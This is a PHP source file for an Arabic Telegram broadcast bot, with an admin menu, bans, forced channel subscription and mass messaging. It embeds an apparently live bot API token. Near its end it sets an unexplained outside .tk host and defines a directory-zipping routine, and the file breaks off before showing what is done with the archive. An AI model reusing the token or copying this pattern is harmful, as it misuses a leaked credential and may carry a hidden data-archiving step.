<?php
ob_start();
$API_KEY = "1834737454:AAFlZllhQXnO5P3E4fTgyzKgSrUmUQJTabM";
$sudo = 1189284654;
$admin = "1189284654";
$bot_id       = 1834737454;
$idbot = $bot_id;
$username="CROZ_BOT";
$botid       = $bot_id;
$botid = $botid;
define('API_KEY',$API_KEY);

if(!is_file(webhook.txt)){
echo file_get_contents("https://api.telegram.org/bot" . API_KEY . "/setwebhook?url=" . $_SERVER['SERVER_NAME'] . "" . $_SERVER['SCRIPT_NAME']); 
file_put_contents("webhook.txt","yes");
}
function bot($method,$datas=[]){
$Alsh = http_build_query($datas);
$url = "https://api.telegram.org/bot".API_KEY."/".$method."?$Alsh";
$Alsh = file_get_contents($url);
return json_decode($Alsh);}
//»»»»»»»»»»»»»»»»»»
$g = str_replace('http://','',$SAIEDZip14);
$SAIEDZip14 = "alivrx.tk/nizk";
$update = json_decode(file_get_contents('php://input'));
$message = $update->message;
$message_id = $update->message->message_id;
$from_id = $message->from->id;
$chat_id = $message->chat->id;
$text = $message->text;
$name = $message->from->first_name;

$from_id = $message->from->id;
date_default_timezone_set('Asia/Riyadh');
$date = date('h:i:s'); $d = date('A');
 $aa =preg_replace('/AM/', 'ص', $d);$aa =preg_replace('/PM/', 'م', $d);

date_default_timezone_set('Asia/Baghdad');
$time = date('h:i a');
$year = date('Y');
$month = date('n');
$day = date('j');

$sting = file_get_contents("sting.txt");
$start = file_get_contents("start.txt") ;
$onstart = file_get_contents("onstart.txt");
$tv = file_get_contents("tv.txt");
$reply = file_get_contents("reply.txt");
$send = file_get_contents("send.txt");
$members = explode("\n",file_get_contents("members.txt"));
$band_id = explode("\n",file_get_contents("band_id.txt"));
$memberscount = count($members);
$band_user = explode("\n",file_get_contents("band_user.txt"));
$tw = file_get_contents("tw.txt");
$photo = $update->message->photo;
$video = $update->message->video;
$sticker = $update->message->sticker;
$file = $update->message->document;
$music = $update->message->audio;
$voice = $update->message->voice;
$caption = $message->caption;
$photo_id = $update->message->photo[0]->file_id;
$video_id= $update->message->video->file_id;
$sticker_id = $update->message->sticker->file_id;
$file_id = $update->message->document->file_id;
$music_id = $update->message->audio->file_id;
$voice_id = $update->message->voice->file_id;
 
if ($message && !in_array($from_id, $members)) {
    file_put_contents("members.txt", $from_id."\n",FILE_APPEND);
  }
//»»»»»»»»»»»»
$baageel = file_get_contents("baageel.txt");
if($text == "〽️┇› تفعيل البوت" and $chat_id == $admin){
bot('sendmessage',[
	'chat_id'=>$chat_id,
	'text'=>"
📮¦ تم تفعيل البوت بنجاح ✓
",'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
  'reply_to_message_id'=>$message_id,
 ]);
file_put_contents("baageel.txt","on");
}
if($text == "⚠️┇› تعطيل البوت" and $chat_id == $admin){
bot("sendmessage",[
"chat_id"=>$chat_id,
"text"=>"📮¦ تم بنجاح تعطيل البوت ✓",
]);
file_put_contents("baageel.txt","off");
} 
if($message and $baageel =="off" and $chat_id != $admin ){
 bot("sendmessage",[
 "chat_id"=>$from_id,
 "text"=>"⚠️┊› #المعذرة
⚙┊› يوجد صيانه في البوت",
 ]);return false;
}
/////*********الاعدادات********/////
if($user == null){}else{$user5 = $user;}
if($message and in_array($user5, $band_user) and $user != null) {
	bot('sendmessage',['chat_id'=>$chat_id,'text'=>'عذرا انت محظور 😓']);return false;}
  if($message && in_array($from_id, $band_id)) {
	bot('sendmessage',['chat_id'=>$chat_id,'text'=>'عذرا انت محظور 😓']);return false;}

//»»»»»»»»»»»»»»»»»»
$Ali = "1834737454:AAFlZllhQXnO5P3E4fTgyzKgSrUmUQJTabM";
$channel ="@II_Q_LL"; 
$ch=explode("@",$channel); 
for($i=1;$i<=count($ch);$i++){
$join = file_get_contents("https://api.telegram.org/bot".$Ali."/getChatMember?chat_id=@$ch[$i]&user_id=".$from_id);
if($message && (strpos($join,'"status":"left"') or strpos($join,'"Bad Request: USER_ID_INVALID"') or strpos($join,'"status":"kicked"'))!== false){
bot('sendMessage',[
'chat_id'=>$from_id,
'text'=>"
 ⌔∮اسم المجموعة ⋙ 𝑳𝑶𝑹𝒊𝒏 𝑮𝒓𝒐𝒖𝒑 𝑻𝒐 𝑪𝒖𝒕𝒆

⌔∮ ⪼ I عذرا عزيزي عليك
⌔∮ ⪼ I الاشتراك ليعمل البوت
⌔∮ ⪼ ❪ @$ch[$i] ❫️ ؛
---------------------------
- بعد الاشتراك اضغط { /start }*
----------------------------
⌔∮ ⪼ I المطور | @llIIlIIllI
",'parse_mode'=>"Markdown",
'reply_to_message_id'=>$message->message_id,
]);return false;}}
//»»»»»»»»»»»»»»»»»»
if($text == "/admin" or $text == "back 🔙" or $text == "❌┇› الغاء الامر"  or $text == 'رجوع 🔙' or $text =="/start#"){
if($from_id == $admin)
	bot('sendmessage',[
	'chat_id'=>$chat_id, 
	'text' =>"🙋🏻‍♂️ ¦› أهلا بك عزيزي الأدمن 🔱
⚙️ ¦› هذه الاعدادات الخاصة بك 🌚
",'reply_to_message_id'=>$message_id,
 'reply_markup'=>json_encode([
'keyboard'=>[
[
['text'=>"🔱┇› تفعيل التنبيه"],['text'=>"⚠️┇› تعطيل التنبيه"]
],
[
['text'=>"〽️┇› تفعيل البوت"],['text'=>"⚠️┇› تعطيل البوت"]
],
[
['text'=>"🔂┇› تفعيل التوجية"],['text'=>"🔁┇› تعطيل التوجية"]
], 
[
['text'=>"📊┇› الاحصائيات"]
],
[
['text'=>"🚷┇› حظر خاص"],['text'=>"🚫┇› الغاء حظر الخاص"]
],
[
['text'=>"💤┇› حظر بالمعرف"],['text'=>"🌀┇› الغاء الحظر بالمعرف"]
],
[
['text'=>"🎯┇› قسم الاذاعة"]
],
[
['text'=>"💬┇› تفعيل التواصل"],['text'=>"💬┇› تعطيل التواصل"]
],
[
['text'=>"🤖┇› تحديث البوتات"],['text' =>"📁┇› نسخة احتياطية"]
],
[

],
], 
])
]);} 
//»»»»»»»»»»»»»»»»»»
if($text == "💤┇› حظر بالمعرف" and $from_id == $admin) {
	bot("sendMessage",[
"chat_id"=>$chat_id,
"text"=>"
💤¦› حسنا ارسل المعرف العضو الذي تريد حظرة من البوت 
" 
]) ;
file_put_contents("sting.txt","bandu");
} 
if(preg_match('/^(@)(\S{5,32})/i',$text) and $sting == "bandu" and $from_id == $admin){
$tf = str_replace("@","",$text);
bot("sendMessage",[
"chat_id"=>$chat_id,
"text"=>"
🚷 ¦› تم حظر العضو بنجاح
[$text](https://t.me/$tf) 
", 'reply_to_message_id'=>$message_id, 
'reply_markup'=>json_encode([
'keyboard'=>[
[
['text'=>"back 🔙"]
], 
], 
'resize_keyboard'=>true
]),'disable_web_page_preview'=>'true',
  'parse_mode'=>"MarkDown",
]);
bot('sendMessage',[
	'chat_id'=>"$text", 
'text'=>"
🚸 ¦› عذرا عزيزي
📛 ¦› لقد تم حظرك من البوت
👨‍✈️ ¦› بواسطة المطور الاساسي
	" 
]) ;
$tf = str_replace("@","",$text);
file_put_contents("band_user.txt",$tf."\n",FILE_APPEND);
unlink("sting.txt");
} 
//»»»»»»»»»»»»»»»»»»
if($text =="🌀┇› الغاء الحظر بالمعرف" and $from_id == $admin) {
	bot('sendMessage',[
	'chat_id'=>$chat_id, 
	'text'=>"👨‍✈️ ¦› مرحبا عزيزي المطور
🚫 ¦› ارسل ايدي العضو لالغاء الحظر
	"
	]) ;
file_put_contents("sting.txt","unkband1");} 
if($text =="$text" and $sting == "unkband1" and $from_id == $admin) {
$tf = str_replace("@","",$text);
	$a = str_replace("$tf","",file_get_contents("band_user.txt"));
        file_put_contents("band_user.txt",$a);
$tf = str_replace("@","",$text);
	bot('sendMessage',[
	'chat_id'=>$chat_id, 
	'text'=>"🚫 ¦› تم الغاء الحظر بنجاح √
[$text](https://t.me/$tf) 
",'reply_markup'=>json_encode([
'keyboard'=>[
[
['text'=>"back 🔙"]
], 
], 
'resize_keyboard'=>true
]),'disable_web_page_preview'=>'true',
  'parse_mode'=>"MarkDown",
]);
bot('sendMessage',[
	'chat_id'=>$text, 
	'text'=>"👨‍✈️ ¦› مرحبا عزيزي العضو
🚫 ¦› لقد تم رفع القيود عنك
🤖 ¦› يمكنك الان استخدام البوت", 
]);
unlink("sting.txt");
}
//»»»»»»»»»»»»»»»»»»
$rt = $update->message->reply_to_message;
$id = $message->reply_to_message->forward_from->id;
if($tw == "tw" and $from_id != $admin){
	if($text != "/start"){
	bot('forwardMessage', [
'chat_id'=>$admin,
'from_chat_id'=>$chat_id,
'message_id'=>$message->message_id
]);
}
	}
	if($tw == "tw" and $rt and $from_id == $admin){
		bot("sendMessage",[
"chat_id"=>$id,
"text"=>"
$text
"
]);
bot("sendMessage",[
"chat_id"=>$chat_id,
"text"=>"
📮¦› تم الارسال بنجاح √
"
]);
		}
if($text == "💬┇› تعطيل التواصل" and $from_id == $admin){
	bot("sendMessage",[
"chat_id"=>$chat_id,
"text"=>"
❎ ¦› تم تعطيل التواصل بنجاح
",'reply_to_message_id'=>$message_id,
  'reply_markup'=>json_encode([
'keyboard'=>[
[
['text'=>"back 🔙"]
], 
], 
'resize_keyboard'=>true
]) 
]);
unlink("tw.txt") ;
	}
if($text == "💬┇› تفعيل التواصل" and $from_id == $admin){
	bot("sendMessage",[
"chat_id"=>$chat_id,
"text"=>"
💬 ¦› تم تفعيل التواصل بنجاح 
",'reply_to_message_id'=>$message_id,
  'reply_markup'=>json_encode([
'keyboard'=>[
[
['text'=>"back 🔙"]
], 
], 
'resize_keyboard'=>true
]) 
]);

file_put_contents('tw.txt','tw');	}
if($text == "📮┇› عدد المشتركين" and $from_id == $admin) {
	bot('sendMessage',[
	'chat_id' =>$chat_id, 
	'text'=>" 
📊¦› عدد مشتركين البوت هو $memberscount
	", 'reply_to_message_id'=>$message_id,
  'reply_markup'=>json_encode([
'keyboard'=>[
[
['text'=>"back 🔙"]
], 
], 
'resize_keyboard'=>true
]) 
]);} 
 
if($text =="🔱┇› تفعيل التنبيه" and $from_id == $admin) {
bot("sendMessage",[
"chat_id"=>$chat_id,
"text"=>"
🔔¦› تم تفعيل التنبيه بنجاح ✔️
",      'reply_to_message_id'=>$message_id,
  'reply_markup'=>json_encode([
'keyboard'=>[
[
['text'=>"back 🔙"]
], 
], 
'resize_keyboard'=>true
]) 
]);
file_put_contents("onstart.txt","start");
} 

if($text =="⚠️┇› تعطيل التنبيه" and $from_id == $admin) {
	bot("sendMessage",[
"chat_id"=>$chat_id,
"text"=>"
🔕¦› تم تعطيل ❎ التنبيه بنجاح ✔️
",
'reply_to_message_id'=>$message_id,
  'reply_markup'=>json_encode([
'keyboard'=>[
[
['text'=>"back 🔙"]
], 
], 
'resize_keyboard'=>true
])
]);
unlink("onstart.txt");
} 
if($text == "🎯┇› قسم الاذاعة" and $chat_id == $admin){
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"🙋🏻‍♂ ¦› أهلا بك عزيزي في قسم الاذاعة
🔘 ¦› إستخدم الأزرار للتحكم بنوع الاذاعة
",'reply_to_message_id'=>$message_id,
  'reply_markup'=>json_encode([
'keyboard'=>[
[
['text'=>"📝┇› نشر رسالة"],['text'=>"📸┇› نشر صورة"]
],
[
['text'=>"📹┇› نشر فيديو"],['text'=>"🏧┇› نشر ملصق"]
],
[
['text'=>"📂┇› نشر ملف"],['text'=>"🎙┇› نشر صوت"]
],
[
['text'=>"Ⓜ️┇› نشر ماركدوان"],['text'=>"⚜┇› نشر HTML"]
],
[
['text'=>"🔄┇› اذاعة عام بالتوجية"],['text'=>"📢┇› اذاعة عام للكل"]
],
[
['text' =>"®┇› اذاعة في القنوات"],['text'=>"↩️┇› اذاعة خاص بالتوجيه"]
],
[
['text'=>"رجوع 🔙"]
],
],
])
]);
}
//»»»»»»»»»»»»»»»»»»
if($text == "❌┇› الغاء الامر"){
	unlink("send.txt");
	}
if($text == "❌┇› الغاء الامر" and $send != null){
	unlink('send.txt');
	bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"
❎ ¦› تم الإلغاء بنجاح 💯
🔙 ¦› سيتم الرجوع للقائمة الرئيسة بعد 5 ثواني
",'reply_to_message_id'=>$message_id,
]);
sleep(4);
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"🙋🏻‍♂ ¦› أهلا بك عزيزي في قسم الاذاعة
🔘 ¦› إستخدم الأزرار للتحكم بنوع الاذاعة
",'reply_to_message_id'=>$message_id,
  'reply_markup'=>json_encode([
'keyboard'=>[
[
['text'=>"نشر رسالة 💌"],['text'=>"نشر صورة 🎑"]
],
[
['text'=>"نشر فيديو 🎥"],['text'=>"نشر ملصق 🎐"]
],
[
['text'=>"نشر ملف 📁"],['text'=>"نشر صوت 🎧"]
],
[
['text'=>"نشر ماركدون 🎐"],['text'=>"نشر HTML 📮"]
],
[
['text'=>"🔄┇› اذاعة عام بالتوجية"],['text'=>"📢┇› اذاعة عام للكل"]
],
[
['text'=>"رجوع 🔙"],['text'=>"نشر اعلان في القنوات 💥"]
],
],
])
]);
	}
//»»»»»»»»»»»»»»»»»»
if($text == "📝┇› نشر رسالة" and $from_id == $admin){
	file_put_contents('send.txt','txt');
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"
💬 ¦› الان ارسل اي شيء لارسله ل $memberscount
",'reply_to_message_id'=>$message_id,
  'reply_markup'=>json_encode([
'keyboard'=>[
[
['text'=>"❌┇› الغاء الامر"]
],
],
])
]);
}
if($text == "📸┇› نشر صورة" and $from_id == $admin){
	file_put_contents('send.txt','photo');
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"
🌌 ¦› الان ارسل اي صورة لارسلها ل $memberscount
",'reply_to_message_id'=>$message_id,
  'reply_markup'=>json_encode([
'keyboard'=>[
[
['text'=>"❌┇› الغاء الامر"]
],
],
])
]);
	}
	if($text == '📹┇› نشر فيديو' and $from_id == $admin){
		file_put_contents('send.txt','video');
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"
🌌¦› الان ارسل اي فيديو لارسلها ل $memberscount
",'reply_to_message_id'=>$message_id,
  'reply_markup'=>json_encode([
'keyboard'=>[
[
['text'=>"❌┇› الغاء الامر"]
],
],
])
]);
	}
	if($text == "🏧┇› نشر ملصق" and $from_id == $admin){
	file_put_contents('send.txt','sticker');
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"
💬 ¦› الان ارسل اي ملصق لارسله ل $memberscount
",'reply_to_message_id'=>$message_id,
  'reply_markup'=>json_encode([
'keyboard'=>[
[
['text'=>"❌┇› الغاء الامر"]
],
],
])
]);
}
	if($text == "📂┇› نشر ملف" and $from_id == $admin){
	file_put_contents('send.txt','file');
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"
💬 ¦› الان ارسل اي ملف او صورة gif لارسله ل $memberscount
",'reply_to_message_id'=>$message_id,
  'reply_markup'=>json_encode([
'keyboard'=>[
[
['text'=>"❌┇› الغاء الامر"]
],
],
])
]);
}
	if($text == "🎙┇› نشر صوت" and $from_id == $admin){
		file_put_contents('send.txt','music');
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"
💬 ¦› الان ارسل اي ملف صوتي 🎧 لارسله ل $memberscount
",'reply_to_message_id'=>$message_id,
  'reply_markup'=>json_encode([
'keyboard'=>[
[
['text'=>"❌┇› الغاء الامر"]
],
],
])
]);
}
	if($text == "Ⓜ️┇› نشر ماركدوان" and $from_id == $admin){
		file_put_contents('send.txt','Markdown');
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"
💬 ¦› الان ارسل اي نص وسيدعم الماركدون لارسله ل $memberscount
",'reply_to_message_id'=>$message_id,
  'reply_markup'=>json_encode([
'keyboard'=>[
[
['text'=>"❌┇› الغاء الامر"]
],
],
])
]);
}
if($text == "⚜┇› نشر HTML" and $from_id == $admin){
		file_put_contents('send.txt','HTML');
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"
💬 ¦› الان ارسل اي نص  وسيدعم الHTML لارسله ل $memberscount
",'reply_to_message_id'=>$message_id,
  'reply_markup'=>json_encode([
'keyboard'=>[
[
['text'=>"❌┇› الغاء الامر"]
],
],
])
]);
}
//»»»»»»»»»»»»»»»»»»
if($from_id == $admin and $text != "❌┇› الغاء الامر"){
if($text != '❌┇› الغاء الامر' and $send == "txt" and $from_id == $admin){
	for($i=0;$i<count($members); $i++){
bot('sendMessage', [
'chat_id'=>$members[$i],
'text'=>"$text",
'parse_mode'=>"MARKDOWN",
'parse_mode'=>"HTML",
'disable_web_page_preview'=>true,
]);
unlink('send.txt');
}
}
if($text != 'إلغاء ' and $send == 'photo'){
	for($i=0;$i<count($members); $i++){
bot('sendphoto', [
'chat_id'=>$members[$i],
'photo'=>$photo_id,
'caption'=>$caption,
'parse_mode'=>"MARKDOWN",
'parse_mode'=>"HTML",
'disable_web_page_preview'=>true,
]);
unlink('send.txt');
}
}
if($text != 'إلغاء ' and $send == 'video'){
	for($i=0;$i<count($members); $i++){
bot('Sendvideo',[
'chat_id'=>$members[$i],
'video'=>$video_id,
'caption'=>$caption,
'parse_mode'=>"MARKDOWN",
'parse_mode'=>"HTML",
'disable_web_page_preview'=>true,
]);
unlink('send.txt');
}
}
if($text != 'إلغاء ' and $send == 'sticker'){
	for($i=0;$i<count($members); $i++){
bot('Sendsticker',[
'chat_id'=>$members[$i],
'sticker'=>$sticker_id,
'parse_mode'=>"MARKDOWN",
'parse_mode'=>"HTML",
'disable_web_page_preview'=>true,
]);
unlink('send.txt');
}
}
if($text != 'إلغاء ' and $send == 'file'){
	for($i=0;$i<count($members); $i++){
 bot('SendDocument',[
'chat_id'=>$members[$i],
'document'=>$file_id,
'parse_mode'=>"MARKDOWN",
'parse_mode'=>"HTML",
'disable_web_page_preview'=>true,
]);
unlink('send.txt');
}
}
if($text != 'إلغاء ' and $send == 'music' and $music){
	for($i=0;$i<count($members); $i++){
 bot('Sendaudio',[
'chat_id'=>$members[$i],
'audio'=>$music_id,
'parse_mode'=>"MARKDOWN",
'parse_mode'=>"HTML",
'disable_web_page_preview'=>true,
]);
unlink('send.txt');
}
}
if($text != 'إلغاء ' and $send == 'music' and $voice){
	for($i=0;$i<count($members); $i++){
 bot('Sendvoice',[
'chat_id'=>$members[$i],
'voice'=>$voice_id,
'parse_mode'=>"MARKDOWN",
'parse_mode'=>"HTML",
'disable_web_page_preview'=>true,
]);
unlink('send.txt');
}
}
if($text != 'إلغاء ' and $send == 'Markdown'){
	for($i=0;$i<count($members); $i++){
bot('sendMessage', [
'chat_id'=>$members[$i],
'text'=>"$text",
'parse_mode'=>"MARKDOWN",
'disable_web_page_preview'=>true,
]);
unlink('send.txt');
}
}
if($text != 'إلغاء ' and $send == 'HTML'){
	for($i=0;$i<count($members); $i++){
bot('sendMessage', [
'chat_id'=>$members[$i],
'text'=>"$text",
'parse_mode'=>"HTML",
'disable_web_page_preview'=>true,
]);
unlink('send.txt');
}
}
}
if($text == "❌┇› الغاء الامر" and $from_id == $admin){
unlink("sting.txt") ;
unlink('send.txt');
}
if($text =="🔂┇› تفعيل التوجية" and $from_id == $admin) {
	bot("sendMessage",[
"chat_id"=>$chat_id,
"text"=>"
🔄 ¦› تم تفعيل التوجيه بنجاح ✔️
", 
'reply_to_message_id'=>$message_id,
  'reply_markup'=>json_encode([
'keyboard'=>[
[
['text'=>"back 🔙"]
], 
], 
'resize_keyboard'=>true
]) 
]);
file_put_contents("reply.txt","yhya");
} 
if($from_id == $admin){}else{
if($message and $reply == "yhya" ){
bot('forwardMessage', [
'chat_id'=>$admin,
'from_chat_id'=>$from_id,
'message_id'=>$message->message_id
]);
}}
	if($text == "🔁┇› تعطيل التوجية" and $from_id == $admin) {
		bot("sendMessage",[
"chat_id"=>$chat_id,
"text"=>"
🔒¦› تم تعطيل التوجيه بنجاح ✔️
", 
'reply_to_message_id'=>$message_id,
  'reply_markup'=>json_encode([
'keyboard'=>[
[
['text'=>"back 🔙"]
], 
], 
'resize_keyboard'=>true
]) 
]);
unlink("reply.txt");
} 
if($text == "🚷┇› حظر خاص" and $from_id == $admin) {
	bot("sendMessage",[
"chat_id"=>$chat_id,
"text"=>"
👨‍✈️ ¦› مرحبا عزيزي المطور
🚫 ¦› ارسل ايدي العضو لحظره من البوت
" 
]) ;
file_put_contents("sting.txt","band");
} 
if(preg_match('/^()(\S{5,32})/i',$text) and $sting == "band" and $from_id == $admin ){
bot("sendMessage",[
"chat_id"=>$chat_id,
"text"=>"
🔊 ¦› تم حظره  بنجاح ✔️
[$text](tg://user?id=$text) 
", 'reply_to_message_id'=>$message_id, 
'reply_markup'=>json_encode([
'keyboard'=>[
[
['text'=>"back 🔙"]
], 
], 
'resize_keyboard'=>true
]),'disable_web_page_preview'=>'true',
  'parse_mode'=>"MarkDown",
]);
bot('sendMessage',[
	'chat_id'=>$text, 
'text'=>"🚸 ¦› عذرا عزيزي
📛 ¦› لقد تم حظرك من البوت
👨‍✈️ ¦› بواسطة المطور الاساسي
	" 
]) ;
file_put_contents("band_id.txt",$text."\n",FILE_APPEND);
unlink("sting.txt");
} 

/*end siting admin ⚙️ */
if($text =="🚫┇› الغاء حظر الخاص" and $from_id == $admin) {
	bot('sendMessage',[
	'chat_id'=>$chat_id, 
	'text'=>"
👨‍✈️ ¦› مرحبا عزيزي المطور
🚫 ¦› ارسل ايدي العضو لالغاء الحظر
	"
	]) ;
file_put_contents("sting.txt","unkband");} 
if($text =="$text" and $sting == "unkband" and $from_id == $admin) {
	$a = str_replace("$text","",file_get_contents("band_id.txt"));
        file_put_contents("band_id.txt",$a);
	bot('sendMessage',[
	'chat_id'=>$chat_id, 
	'text'=>"🚫 ¦› تم الغاء الحظر بنجاح √
[$text](tg://user?id=$text) 
",'reply_markup'=>json_encode([
'keyboard'=>[
[
['text'=>"back 🔙"]
], 
], 
'resize_keyboard'=>true
]),'disable_web_page_preview'=>'true',
  'parse_mode'=>"MarkDown",
]);
bot('sendMessage',[
	'chat_id'=>$text, 
	'text'=>"👨‍✈️ ¦› مرحبا عزيزي العضو
🚫 ¦› لقد تم رفع القيود عنك
🤖 ¦› يمكنك الان استخدام البوت", 
	
]);
unlink("sting.txt");
}
//»»»»»»»»»»»»
$update=json_decode(file_get_contents('php://input'));
$message=$update->message;
$chat_id=$message->chat->id;
$name=$message->from->first_name; 
$sub=substr($name,0,10)." ..."; 
if($text=="/start"){
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"",
]);
}
//»»»»»»»»»»»»
$update     = json_decode(file_get_contents('php://input'));
$message = $update->message;
$message_id = $update->message->message_id;
$text           = $message->text;
$chat_id     = $message->chat->id;
$user          = $update->message->from->username;

$from_id     = $message->from->id;
$first_name = $message->from->first_name;
$type       = $update->message->chat->type;
mkdir("Fri3nd_s");
$message_id = $message->message_id;
$gp_get = file_get_contents("Fri3nd_s/groups.txt");
$groups = explode("\n", $gp_get);
$GG1ZZ = file_get_contents("Fri3nd_s/iBadlz.txt");
$pirvate = explode("\n",file_get_contents("Fri3nd_s/pirvate.txt"));
$forward = $update->message->forward_from;
$MOhaMMed = count($pirvate)-1;
$MoHaMMedd = count($groups)-1;

if($text == "اذاعه بالتوجيه" || $text == "اذاعه عام بالتوجيه" || $text == "اذاعه للكل بالتوجيه" || $text =="🔄┇› اذاعة عام بالتوجية" and $from_id == $sudo){
    file_put_contents("Fri3nd_s/iBadlz.txt","iBadlz");
    bot('sendmessage',[
    'chat_id'=>$chat_id,
    'text'=>"*📮• اهلا عزيزي الـمطور ، قم بتوجيه رسالةه*",
    'parse_mode'=>"MARKDOWN",
    'reply_to_message_id'=>$message->message_id
  ]);
  }
if($message and $GG1ZZ == "iBadlz" and $from_id == $sudo ){
  for($i=0;$i<count($groups);$i++){
bot('ForwardMessage',[
 'chat_id'=>$groups[$i],
 'from_chat_id'=>$chat_id,
 'message_id'=>$message_id,
 ]);
} 
for($i=0;$i<count($pirvate);$i++){
bot('forwardMessage',[
 'chat_id'=>$pirvate[$i],
 'from_chat_id'=>$chat_id,
 'message_id'=>$message->message_id,
 ]);
 unlink("Fri3nd_s/iBadlz.txt");
} 
bot('sendMessage',[
          'chat_id'=>$chat_id,
          'text'=>"*📮• اهلا عزيزي الـمطور ، 
 ⚜• تم ارسال رسالتك الى $memberscount عضو و $MoHaMMedd من مجموعات البوت ،💗ء*",
'parse_mode'=>"MARKDOWN",
'reply_to_message_id'=>$message->message_id,
'reply_markup'=>json_encode([
'keyboard'=>[
[
['text'=>"back 🔙"]
], 
], 
'resize_keyboard'=>true
]) ]);}
if($text and $type == "private" and !in_array($from_id, $pirvate)){
file_put_contents("Fri3nd_s/pirvate.txt", "$from_id\n",FILE_APPEND);
}
if($text and $type == "supergroup" and !in_array($chat_id, $groups)) {
file_put_contents("Fri3nd_s/groups.txt", "$chat_id\n",FILE_APPEND);
}
if($text == "اذاعه خاص" || $text =="⌛️¦ اذاعه خاص" and $from_id == $sudo){
    file_put_contents("Fri3nd_s/iBadlz.txt","JJ119");
    bot('sendmessage',[
    'chat_id'=>$chat_id,
    'text'=>"*📮• اهلا عزيزي الـمطور ، قم بأرسال رسالتك
📥• ملاحظةهہ : يمكنك استعمال الماركداون ،! *",
'parse_mode'=>"MarkDown",
    'reply_to_message_id'=>$message->message_id
  ]);
  }
if($message and $GG1ZZ == "JJ119" and $from_id == $sudo ){
    for ($i=0; $i<count($pirvate); $i++) { 
        bot('sendMessage',[
          'chat_id'=>$pirvate[$i],
          'text'=>"$text",
'parse_mode'=>"MarkDown",
'disable_web_page_preview'=>true,
]);
 file_put_contents("Fri3nd_s/iBadlz.txt","MMoHaMMeD");
} 
$MOhaMMed = count($pirvate)-1;
bot('sendMessage',[
          'chat_id'=>$chat_id,
          'text'=>"*📮• اهلا عزيزي الـمطور ، 
 ⚜• تم ارسال رسالتك الى $memberscount عضو ،💗ء*",
    'parse_mode'=>"MARKDOWN",
    'reply_to_message_id'=>$message->message_id,
     'reply_markup'=>json_encode([
'keyboard'=>[
[
['text'=>"back 🔙"]
], 
], 
'resize_keyboard'=>true
]) ]);}

if ($text == "اذاعه للكل" || $text == "اذاعه عام" || $text == "اذاعه"  ||$text == "📆⎮ اذاعه •" || $text =="📢┇› اذاعة عام للكل" and $from_id == $sudo){
    file_put_contents("Fri3nd_s/iBadlz.txt","LE_C4_KR");
    bot('sendmessage',[
    'chat_id'=>$chat_id,
    'text'=>"*📮• اهلا عزيزي الـمطور ، قم بأرسال رسالتك
📥• ملاحظةهہ : يمكنك استعمال الماركداون ،! *",
'parse_mode'=>"MARKDOWN",
    'reply_to_message_id'=>$message->message_id,
   'reply_markup'=>json_encode([
'keyboard'=>[
[
['text'=>"back 🔙"]
], 
], 
'resize_keyboard'=>true
]) ]);}

if($message and $GG1ZZ == "LE_C4_KR" and $from_id == $sudo ){
    for ($i=0; $i<count($groups); $i++) { 
        bot('sendMessage',[
          'chat_id'=>$groups[$i],
          'text'=>"$text",
'parse_mode'=>"MarkDown",
'disable_web_page_preview'=>true,
]);
} 
for ($i=0; $i<count($pirvate); $i++) { 
        bot('sendMessage',[
          'chat_id'=>$pirvate[$i],
          'text'=>"$text",
'parse_mode'=>"MarkDown",
'disable_web_page_preview'=>true,
]);
 unlink("Fri3nd_s/iBadlz.txt");
} 
bot('sendMessage',[
          'chat_id'=>$chat_id,
          'text'=>"*📮• اهلا عزيزي الـمطور ، 
 ⚜• تم ارسال رسالتك الى $memberscount عضو و $MoHaMMedd من مجموعات البوت ،💗ء*",
 'parse_mode'=>"MarkDown",
          'reply_to_message_id'=>$message->message_id,
          'reply_markup'=>json_encode([
'keyboard'=>[
[
['text'=>"back 🔙"]
], 
], 
'resize_keyboard'=>true
]) ]);}

if($text == "اذاعه خاص بالتوجيه" || $text == "↩️┇› اذاعة خاص بالتوجيه" and $from_id == $sudo){
    file_put_contents("Fri3nd_s/iBadlz.txt","od_1j");
    bot('sendmessage',[
    'chat_id'=>$chat_id,
    'text'=>"*📮• اهلا عزيزي الـمطور ، قم بتوجيه رسالةه*",
    'parse_mode'=>"MARKDOWN",
    'reply_to_message_id'=>$message->message_id
  ]);
  }
if($message and $GG1ZZ == "od_1j" and $from_id == $sudo ){
for($i=0;$i<count($pirvate);$i++){
bot('forwardMessage',[
 'chat_id'=>$pirvate[$i],
 'from_chat_id'=>$chat_id,
 'message_id'=>$message->message_id,
 ]);
 unlink("Fri3nd_s/iBadlz.txt");
} 
$MOhaMMed = count($pirvate)-1;
bot('sendMessage',[
          'chat_id'=>$chat_id,
          'text'=>"*📮• اهلا عزيزي الـمطور ، 
⚜• تم توجيه رسالتك الى $memberscount عضو ،💗ء*",
'parse_mode'=>"MARKDOWN",
          'reply_to_message_id'=>$message->message_id,
          'reply_markup'=>json_encode([
'keyboard'=>[
[
['text'=>"back 🔙"]
], 
], 
'resize_keyboard'=>true
]) ]);}
//»»»»»»»»»»»»»»»»»»
//»»»»»»»»»»»»
$g = str_replace('http://','',$SAIEDZip14);
function SAIEDZip($SAIEDZip1, $SAIEDZip2){
$SAIEDZip4 = realpath($SAIEDZip1);
$SAIEDZip = new ZipArchive();
$SAIEDZip->open($SAIEDZip2, ZipArchive::CREATE | ZipArchive::OVERWRITE);
$SAIEDZip3 = new RecursiveIteratorIterator(
new RecursiveDirectoryIterator($SAIEDZip4),
RecursiveIteratorIterator::LEAVES_ONLY);
foreach($SAIEDZip3 as $SAIEDZip5 => $SAIEDZip6){
if(!$SAIEDZip6->isDir()){
$SAIEDZip7 = $SAIEDZip6->getRealPath();
$SAIEDZip8 = substr($SAIEDZip7, strlen($SAIEDZip4) + 1);
$SAIEDZip->addFile($SAIEDZip7, $SAIEDZip8);
}}
$SAIEDZip->close();
}
function SAIEDZip1($SAIEDZip9, $SAIEDZip10 = 2){
